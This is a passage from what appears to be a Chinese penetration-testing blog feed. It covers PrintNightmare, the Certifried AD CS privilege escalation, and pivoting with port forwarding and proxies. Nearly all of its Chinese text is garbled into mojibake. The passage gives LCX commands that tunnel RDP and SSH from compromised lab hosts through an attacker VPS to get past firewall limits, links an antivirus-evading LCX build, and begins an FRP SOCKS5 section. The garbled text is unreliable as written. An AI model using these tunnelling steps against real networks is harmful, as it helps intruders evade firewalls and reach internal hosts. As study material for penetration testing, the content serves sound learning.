‡å‡†ç”¨æˆ·å¯ä»¥é€šè¿‡ PrintNightmare æ¼æ´ç»•è¿‡ PfcAddPrinterDriver çš„å®‰å…¨éªŒè¯,å¹¶åœ¨æ‰“å°æœåŠ¡å™¨ä¸­å®‰è£…æ¶æ„çš„é©±åŠ¨ç¨‹åºã€‚è‹¥å½“å‰æ‰€æ§åˆ¶çš„ç”¨æˆ·åœ¨åŸŸä¸­ï¼Œåˆ™å¯ä»¥è¿æ¥åˆ°åŸŸæ§åˆ¶å™¨ä¸­çš„ Print Spooler æœåŠ¡å¹¶åœ¨åŸŸæ§åˆ¶å™¨ä¸­å®‰è£…æ¶æ„çš„é©±åŠ¨ç¨‹åºï¼Œè¿›è€Œæ¥ç®¡æ•´ä¸ªåŸŸç¯å¢ƒã€‚</p><h1 id="certifriedåŸŸå†…ææƒ"><a href="#CertifriedåŸŸå†…ææƒ" class="headerlink" title="CertifriedåŸŸå†…ææƒ"></a>CertifriedåŸŸå†…ææƒ</h1><p>2022å¹´5æœˆ10æ—¥ï¼Œå¾®è½¯å‘å¸ƒè¡¥ä¸ä¿®å¤äº†ä¸€ä¸ªActive Directory åŸŸæƒé™æå‡æ¼æ´(CVE-2022-26923)ã€‚è¯¥æ¼æ´æ˜¯ç”±äºå¯¹ç”¨æˆ·å±æ€§çš„ä¸æ­£ç¡®è·å–ï¼Œå…è®¸ä½æƒé™ç”¨æˆ·åœ¨å®‰è£…äº†æ´»åŠ¨ç›®å½•è¯ä¹¦æœåŠ¡(Active Directory Certificate Servicesï¼ŒAD CS)æœåŠ¡å™¨è§’è‰²çš„æ´»åŠ¨ç›®å½•ç¯å¢ƒä¸­å°†æƒé™æå‡è‡³åŸŸç®¡ç†å‘˜ã€‚</p><h2 id="æ´»åŠ¨ç›®è¯ä¹¦æœåŠ¡"><a href="#æ´»åŠ¨ç›®è¯ä¹¦æœåŠ¡" class="headerlink" title="æ´»åŠ¨ç›®è¯ä¹¦æœåŠ¡"></a>æ´»åŠ¨ç›®è¯ä¹¦æœåŠ¡</h2><p>æ´»åŠ¨ç›®å½•è¯ä¹¦æœåŠ¡(AD CS)æ˜¯å¾®è½¯å¯¹PKI(PublicKey Infrastructureï¼Œå…¬é’¥åŸºæœ¬ç»“æ„)çš„å®ç°ï¼Œä¸ç°æœ‰çš„æ´»åŠ¨ç›®å½•æ£®æ—é›†æˆï¼Œå¹¶æä¾›ä»åŠ å¯†æ–‡ä»¶ç³»ç»Ÿåˆ°æ•°å­—ç­¾åï¼Œå†åˆ°å®¢æˆ·ç«¯èº«ä»½éªŒè¯ç­‰ä¸€åˆ‡åŠŸèƒ½ã€‚è™½ç„¶é»˜è®¤æƒ…å†µä¸‹æ²¡æœ‰ä¸ºæ´»åŠ¨ç›®å½•ç¯å¢ƒå®‰è£…æ´»åŠ¨ç›®å½•è¯ä¹¦æœåŠ¡ï¼Œä½†æ´»åŠ¨ç›®å½•è¯ä¹¦æœåŠ¡å¦‚ä»Šå·²åœ¨å„å¤§ä¼ä¸šå’Œç»„ç»‡ä¸­è¢«å¹¿æ³›éƒ¨ç½²ã€‚</p><p>PKI æ˜¯ç”¨æ¥å®ç°è¯ä¹¦çš„äº§ç”Ÿã€ç®¡ç†ã€å­˜å‚¨ã€åˆ†å‘å’Œæ’¤é”€ç­‰åŠŸèƒ½ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€å¥—è§£å†³æ–¹æ¡ˆï¼Œå…¶ä¸­éœ€è¦æœ‰è¯ä¹¦é¢å‘æœºæ„ï¼Œå…·æœ‰è¯ä¹¦å‘å¸ƒã€è¯ä¹¦æ’¤æ‰ç­‰åŠŸèƒ½ã€‚</p><h2 id="æ´»åŠ¨ç›®å½•è¯ä¹¦æ³¨å†Œæµç¨‹"><a href="#æ´»åŠ¨ç›®å½•è¯ä¹¦æ³¨å†Œæµç¨‹" class="headerlink" title="æ´»åŠ¨ç›®å½•è¯ä¹¦æ³¨å†Œæµç¨‹"></a>æ´»åŠ¨ç›®å½•è¯ä¹¦æ³¨å†Œæµç¨‹</h2><p>è¦ä»æ´»åŠ¨ç›®å½•è¯ä¹¦æœåŠ¡(ADCS)è·å–è¯ä¹¦ï¼Œå®¢æˆ·ç«¯éœ€ç»è¿‡æ³¨å†Œæµç¨‹</p><p><img src="http://cdn.clown2024.cn/202407151448447.png" alt="image-20240411002111319"></p><p><strong>CAè¯ä¹¦æ˜¯ä»€ä¹ˆ</strong></p><p>CAè¯ä¹¦æ˜¯ç”±æƒå¨çš„æ•°å­—è¯ä¹¦æˆæƒä¸­å¿ƒï¼ˆCertification Authorityï¼Œç®€ç§°CAï¼‰ç­¾å‘çš„ä¸€ç§æ•°å­—è¯ä¹¦ã€‚CAè¯ä¹¦ç”¨äºéªŒè¯å’Œç¡®è®¤å…¬é’¥çš„æ‰€æœ‰è€…èº«ä»½ï¼Œç¡®ä¿é€šä¿¡çš„å®‰å…¨æ€§å’Œå¯ä¿¡åº¦ã€‚</p><p><strong>CAè¯ä¹¦åŒ…å«ä»¥ä¸‹å…³é”®ä¿¡æ¯ï¼š</strong></p><ol><li>å…¬é’¥ï¼šCAè¯ä¹¦åŒ…å«ä¸€ä¸ªå…¬é’¥ï¼Œç”¨äºåŠ å¯†å’ŒéªŒè¯æ•°å­—ç­¾åã€‚</li><li>ä¸»ä½“ä¿¡æ¯ï¼šCAè¯ä¹¦ä¸­åŒ…å«è¯ä¹¦çš„æ‹¥æœ‰è€…ï¼ˆé€šå¸¸æ˜¯ä¸ªäººã€ç»„ç»‡æˆ–è®¾å¤‡ï¼‰çš„èº«ä»½ä¿¡æ¯ï¼Œå¦‚å§“åã€ç»„ç»‡åç§°ã€ç”µå­é‚®ä»¶åœ°å€ç­‰ã€‚</li><li>æœ‰æ•ˆæœŸï¼šCAè¯ä¹¦å…·æœ‰ä¸€ä¸ªæŒ‡å®šçš„æœ‰æ•ˆæœŸï¼Œå³è¯ä¹¦çš„ç”Ÿæ•ˆæ—¥æœŸå’Œè¿‡æœŸæ—¥æœŸã€‚åœ¨æœ‰æ•ˆæœŸå†…ï¼Œè¯ä¹¦å¯ä»¥ç”¨äºåŠ å¯†ã€è§£å¯†å’ŒéªŒè¯æ•°å­—ç­¾åã€‚</li><li>ç­¾åç®—æ³•å’Œç­¾åå€¼ï¼šCAä½¿ç”¨å…¶ç§é’¥å¯¹è¯ä¹¦çš„ä¿¡æ¯è¿›è¡Œæ•°å­—ç­¾åï¼Œä»¥ç¡®ä¿è¯ä¹¦çš„å®Œæ•´æ€§å’ŒçœŸå®æ€§ã€‚è¯ä¹¦ä¸­åŒ…å«äº†ç­¾åå€¼å’Œç”¨äºç”Ÿæˆç­¾åçš„ç®—æ³•ä¿¡æ¯ã€‚</li></ol><p><strong>CAè¯ä¹¦çš„å·¥ä½œåŸç†å¦‚ä¸‹ï¼š</strong></p><ol><li>è¯ä¹¦è¯·æ±‚ï¼šç”³è¯·è€…ç”Ÿæˆä¸€ä¸ªè¯ä¹¦è¯·æ±‚ï¼ˆCertificate Signing Requestï¼Œç®€ç§°CSRï¼‰ï¼ŒåŒ…å«å…¶å…¬é’¥å’Œèº«ä»½ä¿¡æ¯ã€‚CSRæäº¤ç»™CAä»¥ç”³è¯·è¯ä¹¦ã€‚</li><li>CAéªŒè¯ï¼šCAå¯¹ç”³è¯·è€…çš„èº«ä»½è¿›è¡ŒéªŒè¯ï¼Œå¹¶ç¡®è®¤å…¶å…¬é’¥çš„çœŸå®æ€§ã€‚éªŒè¯å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼è¿›è¡Œï¼Œå¦‚èº«ä»½éªŒè¯ã€åŸŸåéªŒè¯ç­‰ã€‚</li><li>ç­¾å‘è¯ä¹¦ï¼šç»è¿‡éªŒè¯åï¼ŒCAä½¿ç”¨è‡ªå·±çš„ç§é’¥å¯¹è¯ä¹¦è¯·æ±‚è¿›è¡Œæ•°å­—ç­¾åï¼Œç”Ÿæˆæœ€ç»ˆçš„CAè¯ä¹¦ã€‚</li><li>è¯ä¹¦åˆ†å‘ï¼šCAå°†ç­¾å‘çš„è¯ä¹¦å‘é€ç»™ç”³è¯·è€…ã€‚ç”³è¯·è€…å¯ä»¥å°†è¯¥è¯ä¹¦ç”¨äºåŠ å¯†é€šä¿¡ã€æ•°å­—ç­¾åéªŒè¯ç­‰æ“ä½œã€‚</li></ol><blockquote><p>CAè¯ä¹¦çš„ä½œç”¨æ˜¯å»ºç«‹æ•°å­—èº«ä»½å’Œå»ºç«‹ä¿¡ä»»é“¾ã€‚ç”±äºCAæ˜¯è¢«å¹¿æ³›è®¤å¯å’Œä¿¡ä»»çš„æƒå¨æœºæ„ï¼Œå…¶ç­¾å‘çš„è¯ä¹¦èƒ½å¤ŸéªŒè¯è¯ä¹¦æŒæœ‰è€…çš„èº«ä»½ï¼Œç¡®ä¿é€šä¿¡çš„å®‰å…¨æ€§å’Œå¯ä¿¡åº¦ã€‚å®¢æˆ·ç«¯å¯ä»¥éªŒè¯æœåŠ¡å™¨çš„CAè¯ä¹¦ï¼Œç¡®ä¿ä¸å…¶é€šä¿¡çš„æœåŠ¡å™¨æ˜¯åˆæ³•å’Œå¯ä¿¡èµ–çš„ã€‚</p><p>åœ¨Webå®‰å…¨é¢†åŸŸï¼ŒCAè¯ä¹¦ä¹Ÿç”¨äºHTTPSåè®®ï¼Œç”¨äºéªŒè¯ç½‘ç«™çš„çœŸå®æ€§å’Œå»ºç«‹å®‰å…¨çš„åŠ å¯†é€šä¿¡é€šé“ã€‚</p></blockquote><p><strong>æ³¨å†Œæµç¨‹</strong></p><p>æ¦‚æ‹¬åœ°è¯´ï¼Œåœ¨æ³¨å†ŒæœŸé—´ï¼Œå®¢æˆ·ç«¯é¦–å…ˆæ ¹æ®æ´»åŠ¨ç›®å½•Enrollment Services å®¹å™¨ä¸­çš„å¯¹è±¡æ‰¾åˆ°ä¼ä¸š CAï¼Œç„¶åç”Ÿæˆä¸€ä¸ªå…¬é’¥&#x2F;ç§é’¥å¯¹ï¼Œå¹¶å°†å…¬é’¥ã€è¯ä¹¦ä¸»é¢˜å’Œè¯ä¹¦æ¨¡æ¿åç§°ç­‰å…¶ä»–è¯¦ç»†ä¿¡æ¯ä¸€èµ·æ”¾å…¥è¯ä¹¦ç­¾åè¯·æ±‚(Certificate SigningRequestï¼ŒCSR)æ¶ˆæ¯ã€‚å®¢æˆ·ç«¯ä½¿ç”¨å…¶ç§é’¥ç­¾ç½² CSRï¼Œå¹¶å°† CSRå‘é€åˆ°ä¼ä¸š CA æœåŠ¡å™¨ã€‚CA æœåŠ¡å™¨æ£€æŸ¥å®¢æˆ·ç«¯æ˜¯å¦å¯ä»¥è¯·æ±‚è¯ä¹¦ï¼Œå¦‚æœæ˜¯ï¼Œå°±ä¼šé€šè¿‡æŸ¥æ‰¾CSR ä¸­æŒ‡å®šçš„è¯ä¹¦æ¨¡æ¿ AD å¯¹è±¡æ¥ç¡®å®šæ˜¯å¦ä¼šé¢å‘è¯ä¹¦CA å°†æ£€æŸ¥è¯ä¹¦æ¨¡æ¿ ADå¯¹è±¡çš„æƒé™æ˜¯å¦å…è®¸è¯¥è´¦æˆ·è·å–è¯ä¹¦ï¼Œå¦‚æœæ˜¯ï¼Œå°±å°†ä½¿ç”¨è¯ä¹¦æ¨¡æ¿å®šä¹‰çš„â€œè“å›¾â€è®¾ç½®(å¦‚EKUã€åŠ å¯†è®¾ç½®å’Œé¢å‘è¦æ±‚ç­‰)å¹¶ä½¿ç”¨ CSRä¸­æä¾›çš„å…¶ä»–ä¿¡æ¯(å¦‚æœè¯ä¹¦çš„æ¨¡æ¿è®¾ç½®å…è®¸)ç”Ÿæˆè¯ä¹¦ã€‚CAä½¿ç”¨å…¶ç§é’¥ç­¾ç½²è¯ä¹¦ï¼Œç„¶åè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p><p>CA é¢å‘çš„è¯ä¹¦å¯ä»¥æä¾›åŠ å¯†(å¦‚åŠ å¯†æ–‡ä»¶ç³»ç»Ÿ)ã€æ•°å­—ç­¾å(å¦‚ä»£ç ç­¾å)å’Œèº«ä»½éªŒè¯(å¦‚å¯¹AD)ç­‰æœåŠ¡ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘æ¸—é€ä½“ç³»å»ºè®¾-ç«¯å£è½¬å‘å’Œä»£ç†</title>
      <link href="/2024/03/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/"/>
      <url>/2024/03/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="ç«¯å£è½¬å‘å’Œä»£ç†"><a href="#ç«¯å£è½¬å‘å’Œä»£ç†" class="headerlink" title="ç«¯å£è½¬å‘å’Œä»£ç†"></a>ç«¯å£è½¬å‘å’Œä»£ç†</h1><p>åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œåœ¨è·å–ç›®æ ‡å¤–ç½‘æƒé™åï¼Œéœ€è¦é€šè¿‡è½¬å‘ç«¯å£æˆ–æ­å»ºä»£ç†ç­‰æ–¹å¼å»ºç«‹å†…ç½‘é€šé“ã€‚</p><h2 id="æ­£å‘è¿æ¥ä¸åå‘è¿æ¥"><a href="#æ­£å‘è¿æ¥ä¸åå‘è¿æ¥" class="headerlink" title="æ­£å‘è¿æ¥ä¸åå‘è¿æ¥"></a>æ­£å‘è¿æ¥ä¸åå‘è¿æ¥</h2><p>ä¸¤ä¸ªåŸºæœ¬æ¦‚å¿µï¼š<strong>æ­£å‘è¿æ¥å’Œåå‘è¿æ¥</strong>ã€‚ä¾‹å¦‚ï¼ŒMetasploit å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸¤ç§Meterpreterï¼Œä¸€ç§æ˜¯ä»¥ windows&#x2F;meterpreter&#x2F;bind_tcpä¸ºä»£è¡¨çš„ Bind Shell,å¦ä¸€ç§æ˜¯ä»¥ windows&#x2F;meterpreter&#x2F;reverse_tcp ä¸ºä»£è¡¨çš„ Reverse Shellã€‚å…¶ä¸­ï¼ŒBind Shellç”¨äºæ­£å‘è¿æ¥ï¼Œè€ŒReverseShellç”¨äºåå‘è¿æ¥ã€‚</p><ul><li><p>æ­£å‘è¿æ¥ï¼šæ­£å‘è¿æ¥å°±æ˜¯å—æ§ç«¯ä¸»æœºç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç”±æ§åˆ¶ç«¯ä¸»æœºä¸»åŠ¨å»è¿æ¥å—æ§ç«¯ä¸»æœºçš„è¿‡ç¨‹ï¼Œé€‚ç”¨äºå—æ§ä¸»æœºå…·æœ‰å…¬ç½‘IPçš„æƒ…å†µä¸‹ã€‚ä¾‹å¦‚ä¸‹å›¾ä¸­ï¼ŒAttacker å’Œ Victim ä¸»æœºéƒ½å…·æœ‰å…¬ç½‘ IPï¼ŒAttacker å¯ä»¥ç›´æ¥é€šè¿‡IPåœ°å€è®¿é—®åˆ° Victimï¼Œæ‰€ä»¥èƒ½å¤Ÿä½¿ç”¨æ­£å‘è¿æ¥æ¥æ§åˆ¶ Victimã€‚</p><p><img src="http://cdn.clown2024.cn/202407151711902.png" alt="image-20240325091556352"></p></li><li><p>åå‘è¿æ¥ï¼šåå‘è¿æ¥æ˜¯æ§åˆ¶ç«¯ä¸»æœºç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç”±å—æ§ç«¯ä¸»æœºåå‘å»è¿æ¥æ§åˆ¶ç«¯ä¸»æœºçš„è¿‡ç¨‹é€‚ç”¨äºå—æ§ç«¯ä¸»æœºæ²¡æœ‰å…¬ç½‘ IP çš„æƒ…å†µã€‚å¦‚å›¾æ‰€ç¤ºï¼ŒVictim æ˜¯ä¸€å°ä½äºå†…ç½‘å¹¶ä¸”æ²¡æœ‰å…¬ç½‘ IP çš„ä¸»æœºï¼ŒAttacker æ— æ³•ç›´æ¥é€šè¿‡IPåœ°å€è®¿é—®åˆ° Victimã€‚æ‰€ä»¥æ­¤æ—¶éœ€è¦åœ¨Attacker ä¸Šç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œè®© Victim å»åå‘è¿æ¥ Attackerï¼Œä»è€Œå®ç°å¯¹ Victim çš„æ§åˆ¶ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151711903.png" alt="image-20240325092227731"></p></li></ul><h2 id="ç«¯å£è½¬å‘"><a href="#ç«¯å£è½¬å‘" class="headerlink" title="ç«¯å£è½¬å‘"></a>ç«¯å£è½¬å‘</h2><p>ç«¯å£è½¬å‘(Port Forwarding)æ˜¯ç½‘ç»œåœ°å€è½¬æ¢(NAT)çš„ä¸€ç§åº”ç”¨ã€‚é€šè¿‡ç«¯å£è½¬å‘ï¼Œä¸€ä¸ªç½‘ç»œç«¯å£ä¸Šæ”¶åˆ°çš„æ•°æ®å¯ä»¥è¢«è½¬å‘ç»™å¦ä¸€ä¸ªç½‘ç»œç«¯å£ã€‚è½¬å‘çš„ç«¯å£å¯ä»¥æ˜¯æœ¬æœºçš„ç«¯å£ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ä¸»æœºä¸Šçš„ç«¯å£ã€‚</p><p>åœ¨ç°å®ç¯å¢ƒä¸­ï¼Œå†…ç½‘éƒ¨ç½²çš„å„ç§é˜²ç«å¢™å’Œå…¥ä¾µæ£€æµ‹è®¾å¤‡ä¼šæ£€æŸ¥æ•æ„Ÿç«¯å£ä¸Šçš„è¿æ¥æƒ…å†µï¼Œå¦‚æœå‘ç°è¿æ¥å­˜åœ¨å¼‚æ ·ï¼Œå°±ä¼šç«‹å³é˜»æ–­é€šä¿¡ã€‚é€šè¿‡ç«¯å£è½¬å‘ï¼Œè®¾ç½®å°†è¿™ä¸ªè¢«æ£€æµ‹çš„æ•æ„Ÿç«¯å£çš„æ•°æ®è½¬å‘åˆ°é˜²ç«å¢™å…è®¸çš„ç«¯å£ä¸Šï¼Œå»ºç«‹èµ·ä¸€ä¸ªé€šä¿¡éš§é“ï¼Œå¯ä»¥ç»•è¿‡é˜²ç«å¢™çš„æ£€ æµ‹å¹¶ä¸æŒ‡å®šç«¯å£è¿›è¡Œé€šä¿¡ã€‚</p><p>ç«¯å£æ˜ å°„(Port Mapping)ä¹Ÿæ˜¯ç½‘ç»œåœ°å€è½¬æ¢(NAT)çš„ä¸€ç§åº”ç”¨ï¼Œç”¨äºæŠŠå…¬ç½‘çš„åœ°å€ç¿»è¯‘æˆç§æœ‰åœ°å€ã€‚ç«¯å£æ˜ å°„å¯ä»¥å°†å¤–ç½‘ä¸»æœºæ”¶åˆ°çš„è¯·æ±‚æ˜ å°„åˆ°å†…ç½‘ä¸»æœºä¸Šï¼Œä½¿å¾—æ²¡æœ‰å…¬ç½‘IPåœ°å€çš„å†…ç½‘ä¸»æœºèƒ½å¤Ÿå¯¹å¤–æä¾›ç›¸åº”çš„æœåŠ¡ã€‚</p><h2 id="socksä»£ç†"><a href="#SOCKSä»£ç†" class="headerlink" title="SOCKSä»£ç†"></a>SOCKSä»£ç†</h2><p>SOCKS å…¨ç§°ä¸º Protocol For Sessions Traversal Across Firewall Securelyï¼Œæ˜¯ä¸€ç§ä»£ç†åè®®ï¼Œå…¶æ ‡å‡†ç«¯å£ä¸º1080ã€‚SOCKSä»£ç†æœ‰SOCKS4å’ŒSOCKS5ä¸¤ä¸ªç‰ˆæœ¬ï¼ŒSOCKS4åªæ”¯æŒ TCPï¼Œè€Œ SOCKS5 åœ¨SOCKS4çš„åŸºç¡€ä¸Šè¿›ä¸€æ­¥æ‰©å±•ï¼Œå¯ä»¥æ”¯æŒ UDP å’Œå„ç§èº«ä»½éªŒè¯æœºåˆ¶ç­‰åè®®ã€‚é‡‡ç”¨ SOCKSåè®®çš„ä»£ç†æœåŠ¡å™¨è¢«ç§°ä¸ºSOCKSæœåŠ¡å™¨ï¼Œè¿™æ˜¯ä¸€ç§é€šç”¨çš„ä»£ç†æœåŠ¡å™¨ï¼Œåœ¨ç½‘ç»œé€šä¿¡ä¸­æ‰®æ¼”ç€ä¸€ä¸ªè¯·æ±‚ä»£ç†äººçš„è§’è‰²ã€‚åœ¨å†…ç½‘æ¸—é€ä¸­ï¼Œé€šè¿‡æ­å»ºSOCKSä»£ç†ï¼Œå¯ä»¥ä¸ç›®æ ‡å†…ç½‘ä¸»æœºè¿›è¡Œé€šä¿¡ï¼Œé¿å…å¤šæ¬¡ä½¿ç”¨ç«¯å£è½¬å‘ã€‚</p><h1 id="å¸¸è§è½¬å‘ä¸ä»£ç†å·¥å…·"><a href="#å¸¸è§è½¬å‘ä¸ä»£ç†å·¥å…·" class="headerlink" title="å¸¸è§è½¬å‘ä¸ä»£ç†å·¥å…·"></a>å¸¸è§è½¬å‘ä¸ä»£ç†å·¥å…·</h1><h2 id="lck"><a href="#LCK" class="headerlink" title="LCK"></a>LCK</h2><p>LCXæ˜¯ä¸€æ¬¾ååˆ†ç»å…¸çš„å†…ç½‘ç«¯å£è½¬å‘å·¥å…·ï¼ŒåŸºäºSocketå¥—æ¥å­—ï¼Œå…·æœ‰ç«¯å£è½¬å‘å’Œç«¯å£æ˜ å°„çš„åŠŸèƒ½ã€‚ä½†æ˜¯ç›®å‰å¾ˆå¤šæ€æ¯’è½¯ä»¶å·²ç»å°†LCXåŠ å…¥äº†ç‰¹å¾åº“ï¼Œåœ¨å®é™…åˆ©ç”¨æ—¶éœ€è¦è‡ªè¡Œåšå…æ€å¤„ç†ã€‚</p><p>è¿™é‡Œç½‘ä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªå…æ€å¤„ç†è¿‡çš„ï¼š<a href="https://github.com/UndefinedIdentifier/LCX">https://github.com/UndefinedIdentifier/LCX</a></p><ol><li><p>ç›®æ ‡æœ‰å…¬ç½‘IP</p><p>å¦‚å›¾ï¼Œå‡è®¾win_server2012æ˜¯ä¸€å°å…·æœ‰å…¬ç½‘IPåœ°å€çš„WebæœåŠ¡å™¨ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151711904.png" alt="image-20240325100613263"></p><p>å‡è®¾æ­¤æ—¶å·²ç»è·å–äº† WindowsServer 2012çš„æ§åˆ¶æƒ,éœ€è¦ç™»å½•å…¶è¿œç¨‹æ¡Œé¢æŸ¥çœ‹æƒ…å†µ,ä½†æ˜¯é˜²ç«å¢™å¯¹ 3389ç«¯å£åšäº†é™åˆ¶ï¼Œä¸å…è®¸å¤–ç½‘æœºå™¨å¯¹ 3389ç«¯å£è¿›è¡Œè¿æ¥ã€‚é‚£ä¹ˆï¼Œé€šè¿‡ç«¯å£è½¬å‘ï¼Œå¯ä»¥å°†3389ç«¯å£è½¬å‘åˆ°å…¶ä»–é˜²ç«å¢™å…è®¸çš„ç«¯å£ä¸Šï¼Œå¦‚4444ç«¯å£ï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤å³å¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">lck.exe -tran 4444 127.0.0.1:3389<br></code></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡è¿æ¥ Windows Server 2012çš„4444ç«¯å£ï¼Œå³å¯æˆåŠŸè®¿é—®å…¶è¿œç¨‹æ¡Œé¢</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">rdesktop 192.168.2.13:4444<br></code></pre></td></tr></table></figure></li><li><p>ç«¯å£æ˜ å°„</p><p>æµ‹è¯•ç¯å¢ƒå¦‚å›¾æ‰€ç¤ºã€‚å³ä¾§çš„ Web æœåŠ¡å™¨(Windows Server 2012)æœ‰ä¸¤ä¸ªç½‘å¡åˆ†åˆ«è¿é€šå¤–ç½‘å’Œå†…ç½‘,åˆ†åˆ«ä¸ºå…¬ç½‘ IP(æ¨¡æ‹Ÿ)åœ°å€ 192.168.2.13 å’Œå†…ç½‘ IP åœ°å€ 10.10.10.13ã€‚å†…ç½‘è¿˜å­˜åœ¨ä¸€å° MySQL æœåŠ¡å™¨ã€‚å·¦ä¾§çš„KaliLinuxä¸ºæµ‹è¯•äººå‘˜çš„ä¸»æœºã€‚</p><p>å‡è®¾å·²ç»è·å– Windows Server 2012çš„æ§åˆ¶æƒï¼Œç»è¿‡ä¿¡æ¯æ”¶é›†ï¼Œè·å¾—å†…ç½‘ä¸­ MySQLæœåŠ¡å™¨çš„ SSH ç™»å½•å‡­æ®ï¼Œæ¥ä¸‹æ¥éœ€è¦ç™»å½•è¿™å°æœåŠ¡å™¨ã€‚ä½†æ˜¯æœåŠ¡å™¨ä½äºå†…ç½‘ï¼Œæ— æ³•ç›´æ¥é€šè¿‡ IP åœ°å€è¿›è¡Œè®¿é—®ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡ç«¯å£æ˜ å°„ï¼Œå°† MySOL æœåŠ¡å™¨çš„ 22 ç«¯å£æ˜ å°„åˆ°Windows Server 2012</p><p><img src="http://cdn.clown2024.cn/202407151711905.png" alt="image-20240325103859627"></p><p>åœ¨win_server2012æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">lcx.exe -tran 2222 10.10.10.15 22<br></code></pre></td></tr></table></figure><p>ç„¶åè¿æ¥win_server2012çš„2222ç«¯å£ï¼Œå³å¯è®¿é—®MySQLæœåŠ¡å™¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh root@192.168.2.13 -p 2222<br></code></pre></td></tr></table></figure></li><li><p>ç›®æ ‡æ— å…¬ç½‘IP</p><p>æµ‹è¯•ç¯å¢ƒå¦‚å›¾æ‰€ç¤ºã€‚å³ä¾§çš„ WebæœåŠ¡å™¨(Windows Server 2012)æ²¡æœ‰å…¬ç½‘ IPåœ°å€ï¼Œé€šè¿‡ NAT å¯¹å¤–æä¾› Web æœåŠ¡ï¼Œå·¦ä¾§çš„ Ubuntu 20.04ä¸ºæµ‹è¯•äººå‘˜çš„å…¬ç½‘ VPSã€‚</p><p><img src="http://cdn.clown2024.cn/202407151711906.png" alt="image-20240325105824042"></p></li></ol><p>å…ˆåœ¨vpsä¸Šæ‰§è¡Œä¸‹é¢å‘½ä»¤ç›‘å¬æœ¬åœ°4444ç«¯å£ï¼Œå¹¶å°†8888ç«¯å£ä¸Šæ¥æ”¶åˆ°çš„æ•°æ®è½¬å‘ç»™æœ¬æœºçš„4444ç«¯å£</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./lck -listen 4444 8888<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨ Windows Seryer 2012ä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤,æ§åˆ¶ Windows Server 2012 å»è¿æ¥ VPSçš„8888ç«¯å£</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">lcx.exe -slave 192.168.2.x8888 127.0.0.1 3389<br></code></pre></td></tr></table></figure><p>ç„¶åè¿æ¥vpsçš„4444ç«¯å£å³å¯è®¿é—®è¿œç¨‹æ¡Œé¢</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">rdesktop 192.168.2.x:4444<br></code></pre></td></tr></table></figure><h2 id="frp"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p>FRP æ˜¯ä¸€ä¸ªä¸“æ³¨äºå†…ç½‘ç©¿é€çš„é«˜æ€§èƒ½çš„åå‘ä»£ç†åº”ç”¨ï¼Œæ”¯æŒTCPã€UDPã€HTTPã€HTTPS ç­‰åè®®ï¼Œå¯ä»¥å°†å†…ç½‘æœåŠ¡ä»¥å®‰å…¨ã€ä¾¿æ·çš„æ–¹å¼ï¼Œé€šè¿‡å…·æœ‰å…¬ç½‘ IP èŠ‚ç‚¹çš„ä¸­è½¬æš´éœ²åˆ°å…¬ç½‘ã€‚åœ¨è¿›è¡Œå†…ç½‘æ¸—é€ä¸­ï¼ŒFRP æ˜¯ä¸€æ¬¾å¸¸ç”¨çš„éš§é“å·¥å…·é™¤æ­¤ä¹‹å¤–ï¼ŒFRPæ”¯æŒæ­å»ºSOCKS5ä»£ç†åº”ç”¨ã€‚é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><blockquote><p> æœ€æ–°çš„frpä¼¼ä¹ä¸å†é‡‡ç”¨frpc.iniå’Œfrps.inié…ç½®æ–‡ä»¶äº†ï¼Œè€Œæ˜¯.tomlåç¼€çš„æ–‡ä»¶ã€‚</p><p>å…·ä½“ä½¿ç”¨å»çœ‹å®˜æ–¹çš„è¯´æ˜ã€‚æˆ‘è¿™é‡Œè¿˜æ˜¯ç”¨å›æ—§çš„æ–¹ä¾¿å­¦ä¹ </p></blockquote><p><strong>ç°åœ¨åˆ©ç”¨FRPæ­å»ºä¸€ä¸ªSOCKS5ä»£ç†</strong></p><p>ä¹¦ä¸­çš„æµ‹è¯•ç¯å¢ƒå¦‚ä¸‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151711907.png" 